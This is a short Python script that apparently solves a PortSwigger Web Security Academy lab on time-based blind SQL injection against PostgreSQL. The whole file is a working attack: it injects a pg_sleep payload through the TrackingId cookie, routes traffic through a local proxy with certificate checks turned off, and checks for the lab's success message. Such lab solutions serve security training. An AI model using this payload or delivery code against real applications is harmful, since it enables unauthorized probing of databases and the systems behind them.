import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
# db: PostgreSQL
# author: 0xyf


class SQLi14:
    def __init__(self):
        self.lab_id = "0a4800b4036e6b008027f31600c60021"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def execute_request(self, payload):
        cookies = {"TrackingId": payload}
        r = requests.get(
            f"{self.url}", cookies=cookies, proxies=self.proxies, verify=False
        )
        return r

    def sleep(self):
        payload = "'|| pg_sleep(2) -- -"
        r = self.execute_request(payload)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.sleep()
        self.check_solved()


def main():
    SQLi14().solve()


if __name__ == "__main__":
    main()
